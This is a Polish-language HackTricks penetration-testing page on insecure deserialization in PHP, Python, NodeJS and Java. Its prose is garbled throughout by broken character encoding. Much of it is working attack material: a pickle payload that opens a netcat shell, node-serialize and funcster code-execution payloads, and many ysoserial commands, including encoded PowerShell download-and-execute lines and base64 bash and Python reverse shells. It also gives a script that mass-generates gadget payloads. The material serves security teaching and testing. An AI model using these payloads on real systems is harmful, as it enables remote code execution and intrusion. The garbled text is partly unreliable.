# Deserializacja

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}

## Podstawowe informacje

**Serializacja** jest rozumiana jako metoda konwertowania obiektu na format, kt贸ry mo偶na zachowa, z zamiarem przechowywania obiektu lub przesyania go jako cz procesu komunikacji. Technika ta jest powszechnie stosowana, aby zapewni, 偶e obiekt mo偶e by odtworzony w p贸藕niejszym czasie, zachowujc swoj struktur i stan.

**Deserializacja**, przeciwnie, jest procesem, kt贸ry przeciwdziaa serializacji. Polega na wziciu danych, kt贸re zostay ustrukturyzowane w okrelonym formacie i odbudowaniu ich z powrotem w obiekt.

Deserializacja mo偶e by niebezpieczna, poniewa偶 potencjalnie **pozwala atakujcym manipulowa zserializowanymi danymi w celu wykonania szkodliwego kodu** lub spowodowania nieoczekiwanego zachowania w aplikacji podczas procesu odbudowy obiektu.

## PHP

W PHP podczas proces贸w serializacji i deserializacji wykorzystywane s specyficzne metody magiczne:

* `__sleep`: Wywoywana, gdy obiekt jest serializowany. Metoda ta powinna zwraca tablic nazw wszystkich waciwoci obiektu, kt贸re powinny by serializowane. Jest powszechnie u偶ywana do zatwierdzania oczekujcych danych lub wykonywania podobnych zada porzdkowych.
* `__wakeup`: Wywoywana, gdy obiekt jest deserializowany. U偶ywana do przywracania wszelkich pocze z baz danych, kt贸re mogy zosta utracone podczas serializacji oraz do wykonywania innych zada ponownej inicjalizacji.
* `__unserialize`: Ta metoda jest wywoywana zamiast `__wakeup` (jeli istnieje) podczas deserializacji obiektu. Daje wiksz kontrol nad procesem deserializacji w por贸wnaniu do `__wakeup`.
* `__destruct`: Ta metoda jest wywoywana, gdy obiekt ma zosta zniszczony lub gdy skrypt si koczy. Zwykle u偶ywana do zada porzdkowych, takich jak zamykanie uchwyt贸w plik贸w lub pocze z baz danych.
* `__toString`: Ta metoda pozwala traktowa obiekt jako cig znak贸w. Mo偶e by u偶ywana do odczytu pliku lub innych zada opartych na wywoaniach funkcji w nim, skutecznie zapewniajc tekstow reprezentacj obiektu.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Jeli spojrzysz na wyniki, mo偶esz zobaczy, 偶e funkcje **`__wakeup`** i **`__destruct`** s wywoywane, gdy obiekt jest deserializowany. Zauwa偶, 偶e w kilku samouczkach znajdziesz, 偶e funkcja **`__toString`** jest wywoywana, gdy pr贸bujesz wydrukowa jaki atrybut, ale najwyra藕niej **to ju偶 si nie dzieje**.

{% hint style="warning" %}
Metoda **`__unserialize(array $data)`** jest wywoywana **zamiast `__wakeup()`**, jeli jest zaimplementowana w klasie. Umo偶liwia to deserializacj obiektu, dostarczajc zserializowane dane jako tablic. Mo偶esz u偶y tej metody do deserializacji waciwoci i wykonania wszelkich niezbdnych zada po deserializacji.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Mo偶esz przeczyta wyjaniony **przykad PHP tutaj**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), tutaj [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) lub tutaj [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Mo偶esz nadu偶y funkcjonalnoci autoload PHP, aby zaadowa dowolne pliki php i wicej:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializing Referenced Values

Jeli z jakiego powodu chcesz zserializowa warto jako **referencj do innej wartoci zserializowanej**, mo偶esz:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial dla PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) mo偶e pom贸c w generowaniu adunk贸w do nadu偶ywania deserializacji PHP.\
Zauwa偶, 偶e w wielu przypadkach **nie bdziesz w stanie znale藕 sposobu na nadu偶ycie deserializacji w kodzie 藕r贸dowym** aplikacji, ale mo偶esz by w stanie **nadu偶y kodu zewntrznych rozszerze PHP.**\
Wic, jeli mo偶esz, sprawd藕 `phpinfo()` serwera i **przeszukaj internet** (a nawet **gad偶ety** **PHPGGC**) w poszukiwaniu mo偶liwego gad偶etu, kt贸ry m贸gby nadu偶y.

### deserializacja metadanych phar://

Jeli znalaze LFI, kt贸ry tylko odczytuje plik i nie wykonuje kodu php w nim, na przykad u偶ywajc funkcji takich jak _**file\_get\_contents(), fopen(), file() lub file\_exists(), md5\_file(), filemtime() lub filesize()**_**.** Mo偶esz spr贸bowa nadu偶y **deserializacji** wystpujcej podczas **odczytu** **pliku** za pomoc protokou **phar**.\
Aby uzyska wicej informacji, przeczytaj nastpujcy post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Gdy obiekt zostanie odpakowany, funkcja _\_\_reduce\_\__ zostanie wykonana.\
Gdy zostanie wykorzystana, serwer mo偶e zwr贸ci bd.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
For more information about escaping from **pickle jails** check:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

The following page present the technique to **abuse an unsafe deserialization in yamls** python libraries and finishes with a tool that can be used to generate RCE deserialization payload for **Pickle, PyYAML, jsonpickle and ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Class Pollution (Python Prototype Pollution)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### JS Magic Functions

JS **nie ma "magicznych" funkcji** jak PHP czy Python, kt贸re s wykonywane tylko w celu utworzenia obiektu. Ale ma kilka **funkcji**, kt贸re s **czsto u偶ywane nawet bez bezporedniego ich wywoywania**, takich jak **`toString`**, **`valueOf`**, **`toJSON`**.\
Jeli nadu偶yjesz deserializacji, mo偶esz **skompromentowa te funkcje, aby wykona inny kod** (potencjalnie nadu偶ywajc zanieczyszczenia prototypu), co pozwoli ci wykona dowolny kod, gdy zostan wywoane.

Inny **"magiczny" spos贸b na wywoanie funkcji** bez bezporedniego jej wywoywania to **skompromentowanie obiektu, kt贸ry jest zwracany przez funkcj asynchroniczn** (promise). Poniewa偶, jeli **przeksztacisz** ten **obiekt zwracany** w inn **obietnic** z **waciwoci** o nazwie **"then" typu funkcja**, zostanie on **wykonany** tylko dlatego, 偶e jest zwracany przez inn obietnic. _Follow_ [_**this link**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _for more info._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` i zanieczyszczenie `prototype`

Jeli chcesz dowiedzie si wicej o tej technice **zobacz nastpujcy samouczek**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Ta biblioteka pozwala na serializacj funkcji. Przykad:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
Obiekt **serializowany** bdzie wyglda nastpujco:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Mo偶esz zobaczy w przykadzie, 偶e gdy funkcja jest serializowana, flaga `_$$ND_FUNC$$_` jest doczana do obiektu serializowanego.

W pliku `node-serialize/lib/serialize.js` mo偶esz znale藕 t sam flag i spos贸b, w jaki kod jej u偶ywa.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Jak mo偶esz zobaczy w ostatnim kawaku kodu, **jeli flaga zostanie znaleziona**, u偶ywane jest `eval` do deserializacji funkcji, wic zasadniczo **dane wejciowe u偶ytkownika s u偶ywane wewntrz funkcji `eval`**.

Jednak **samego serializowania** funkcji **nie wykona**, poniewa偶 konieczne byoby, aby jaka cz kodu **wywoywaa `y.rce`** w naszym przykadzie, a to jest wysoce **mao prawdopodobne**.\
Tak czy inaczej, mo偶esz po prostu **zmodyfikowa obiekt serializowany**, **dodajc nawiasy**, aby automatycznie wykona serializowan funkcj, gdy obiekt zostanie deserializowany.\
W nastpnym kawaku kodu **zauwa偶 ostatni nawias** i jak funkcja `unserialize` automatycznie wykona kod:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Jak wczeniej wskazano, ta biblioteka pobierze kod po `_$$ND_FUNC$$_` i **wykona go** za pomoc `eval`. Dlatego, aby **automatycznie wykona kod**, mo偶esz **usun cz tworzenia funkcji** oraz ostatni nawias i **po prostu wykona jedn lini JS** jak w poni偶szym przykadzie:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Mo偶esz [**znale藕 tutaj**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **dalsze informacje** na temat tego, jak wykorzysta t luk.

### [funcster](https://www.npmjs.com/package/funcster)

Ciekawym aspektem **funcster** jest niedostpno **standardowych obiekt贸w wbudowanych**; znajduj si one poza dostpnym zakresem. To ograniczenie uniemo偶liwia wykonanie kodu, kt贸ry pr贸buje wywoa metody na obiektach wbudowanych, prowadzc do wyjtk贸w takich jak `"ReferenceError: console is not defined"` gdy u偶ywane s polecenia takie jak `console.log()` lub `require(something)`.

Pomimo tego ograniczenia, przywr贸cenie penego dostpu do kontekstu globalnego, w tym wszystkich standardowych obiekt贸w wbudowanych, jest mo偶liwe dziki specyficznemu podejciu. Wykorzystujc kontekst globalny bezporednio, mo偶na obej to ograniczenie. Na przykad, dostp mo偶na przywr贸ci za pomoc nastpujcego fragmentu:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Aby**[ **uzyska wicej informacji, przeczytaj to 藕r贸do**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

Pakiet **serialize-javascript** jest zaprojektowany wycznie do cel贸w serializacji, nie posiada 偶adnych wbudowanych mo偶liwoci deserializacji. U偶ytkownicy s odpowiedzialni za wdro偶enie wasnej metody deserializacji. Bezporednie u偶ycie `eval` jest sugerowane przez oficjalny przykad do deserializacji danych serializowanych:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Jeli ta funkcja jest u偶ywana do deserializacji obiekt贸w, mo偶esz **atwo to wykorzysta**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Aby**[ **uzyska wicej informacji, przeczytaj to 藕r贸do**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Biblioteka Cryo

Na poni偶szych stronach znajdziesz informacje o tym, jak nadu偶ywa tej biblioteki do wykonywania dowolnych polece:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

W Javie **wywoania zwrotne deserializacji s wykonywane podczas procesu deserializacji**. To wykonanie mo偶e by wykorzystywane przez atakujcych, kt贸rzy tworz zoliwe adunki, kt贸re wyzwalaj te wywoania zwrotne, prowadzc do potencjalnego wykonania szkodliwych dziaa.

### Odciski palc贸w

#### Biaa skrzynka

Aby zidentyfikowa potencjalne luki w serializacji w kodzie, poszukaj:

* Klas implementujcych interfejs `Serializable`.
* U偶ycia funkcji `java.io.ObjectInputStream`, `readObject`, `readUnshared`.

Zwr贸 szczeg贸ln uwag na:

* `XMLDecoder` wykorzystywany z parametrami definiowanymi przez zewntrznych u偶ytkownik贸w.
* Metod `fromXML` w `XStream`, szczeg贸lnie jeli wersja XStream jest mniejsza lub r贸wna 1.46, poniewa偶 jest podatna na problemy z serializacj.
* `ObjectInputStream` poczony z metod `readObject`.
* Implementacj metod takich jak `readObject`, `readObjectNodData`, `readResolve` lub `readExternal`.
* `ObjectInputStream.readUnshared`.
* Og贸lne u偶ycie `Serializable`.

#### Czarna skrzynka

W przypadku testowania czarnej skrzynki, poszukaj specyficznych **sygnatur lub "Magic Bytes"**, kt贸re oznaczaj obiekty zserializowane w Javie (pochodzce z `ObjectInputStream`):

* Wz贸r szesnastkowy: `AC ED 00 05`.
* Wz贸r Base64: `rO0`.
* Nag贸wki odpowiedzi HTTP z `Content-type` ustawionym na `application/x-java-serialized-object`.
* Wz贸r szesnastkowy wskazujcy na wczeniejsze kompresowanie: `1F 8B 08 00`.
* Wz贸r Base64 wskazujcy na wczeniejsze kompresowanie: `H4sIA`.
* Pliki internetowe z rozszerzeniem `.faces` i parametrem `faces.ViewState`. Odkrycie tych wzor贸w w aplikacji internetowej powinno skoni do zbadania, jak opisano w [pocie o deserializacji Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Sprawd藕, czy jest podatny

Jeli chcesz **dowiedzie si, jak dziaa exploit deserializacji w Javie**, powiniene zapozna si z [**Podstawow deserializacj Javy**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializacj DNS w Javie**](java-dns-deserialization-and-gadgetprobe.md) oraz [**adunkiem CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Test biaego pudeka

Mo偶esz sprawdzi, czy zainstalowana jest jakakolwiek aplikacja z znanymi podatnociami.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Mo偶esz spr贸bowa **sprawdzi wszystkie biblioteki**, kt贸re s znane jako podatne i dla kt贸rych [**Ysoserial**](https://github.com/frohoff/ysoserial) mo偶e dostarczy exploit. Mo偶esz r贸wnie偶 sprawdzi biblioteki wskazane na [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Mo偶esz tak偶e u偶y [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector), aby wyszuka mo偶liwe acuchy gadget贸w, kt贸re mo偶na wykorzysta.\
Podczas uruchamiania **gadgetinspector** (po zbudowaniu) nie przejmuj si mn贸stwem ostrze偶e/bd贸w, przez kt贸re przechodzi, i pozw贸l mu zakoczy. Zapisze wszystkie wyniki w _gadgetinspector/gadget-results/gadget-chains-year-month-day-hore-min.txt_. Prosz zauwa偶y, 偶e **gadgetinspector nie stworzy exploita i mo偶e wskazywa faszywe pozytywy**.

#### Test Black Box

U偶ywajc rozszerzenia Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md), mo偶esz zidentyfikowa **kt贸re biblioteki s dostpne** (a nawet ich wersje). Z t informacj mo偶e by **atwiej wybra adunek** do wykorzystania podatnoci.\
[**Przeczytaj to, aby dowiedzie si wicej o GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe koncentruje si na **deserializacjach `ObjectInputStream`**.

U偶ywajc rozszerzenia Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner), mo偶esz **zidentyfikowa podatne biblioteki** nadajce si do wykorzystania z ysoserial i **wykorzysta** je.\
[**Przeczytaj to, aby dowiedzie si wicej o Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner koncentruje si na **deserializacjach `ObjectInputStream`**.

Mo偶esz tak偶e u偶y [**Freddy**](https://github.com/nccgroup/freddy), aby **wykry podatnoci** deserializacji w **Burp**. Ten plugin wykryje **nie tylko podatnoci zwizane z `ObjectInputStream`**, ale **tak偶e** podatnoci z bibliotek deserializacji **Json** i **Yml**. W trybie aktywnym spr贸buje je potwierdzi, u偶ywajc adunk贸w sleep lub DNS.\
[**Mo偶esz znale藕 wicej informacji o Freddy tutaj.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Test Serializacji**

Nie wszystko sprowadza si do sprawdzania, czy serwer u偶ywa jakiejkolwiek podatnej biblioteki. Czasami mo偶esz by w stanie **zmieni dane wewntrz zserializowanego obiektu i obej niekt贸re kontrole** (mo偶e przyzna ci uprawnienia administratora w aplikacji webowej).\
Jeli znajdziesz zserializowany obiekt java wysyany do aplikacji webowej, **mo偶esz u偶y** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper), **aby wydrukowa w bardziej czytelny spos贸b zserializowany obiekt, kt贸ry jest wysyany**. Wiedzc, jakie dane wysyasz, atwiej bdzie je zmodyfikowa i obej niekt贸re kontrole.

### **Exploity**

#### **ysoserial**

G贸wne narzdzie do wykorzystywania deserializacji Java to [**ysoserial**](https://github.com/frohoff/ysoserial) ([**pobierz tutaj**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Mo偶esz tak偶e rozwa偶y u偶ycie [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified), kt贸re pozwoli ci u偶ywa zo偶onych polece (na przykad z u偶yciem potok贸w).\
Zauwa偶, 偶e to narzdzie jest **skoncentrowane** na wykorzystywaniu **`ObjectInputStream`**.\
Zalecabym **rozpoczcie od adunku "URLDNS"** **przed adunkiem RCE**, aby sprawdzi, czy wstrzyknicie jest mo偶liwe. Tak czy inaczej, zauwa偶, 偶e mo偶e adunek "URLDNS" nie dziaa, ale inny adunek RCE mo偶e dziaa.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Kiedy tworzysz adunek dla **java.lang.Runtime.exec()**, **nie mo偶esz u偶ywa znak贸w specjalnych** takich jak ">" lub "|" do przekierowania wyjcia z wykonania, "$()" do wykonywania polece, ani nawet **przekazywa argument贸w** do polecenia oddzielonych **spacjami** (mo偶esz zrobi `echo -n "hello world"`, ale nie mo偶esz zrobi `python2 -c 'print "Hello world"'`). Aby poprawnie zakodowa adunek, mo偶esz [u偶y tej strony](http://www.jackson-t.ca/runtime-exec-payloads.html).

Czuj si swobodnie, aby u偶y nastpnego skryptu do stworzenia **wszystkich mo偶liwych adunk贸w wykonania kodu** dla Windows i Linux, a nastpnie przetestowa je na podatnej stronie internetowej:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Mo偶esz **u偶y** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **razem z ysoserial, aby stworzy wicej exploit贸w**. Wicej informacji na temat tego narzdzia znajduje si w **prezentacji**, w kt贸rej narzdzie zostao zaprezentowane: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec)mo偶e by u偶ywane do generowania adunk贸w do eksploatacji r贸偶nych **Json** i **Yml** bibliotek serializacji w Javie.\
Aby skompilowa projekt, musiaem **doda** te **zale偶noci** do `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Zainstaluj maven**, a nastpnie **skompiluj** projekt:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Przeczytaj wicej o tej bibliotece Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Jeli chcesz przetestowa kilka adunk贸w ysoserial, mo偶esz **uruchomi t aplikacj webow**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
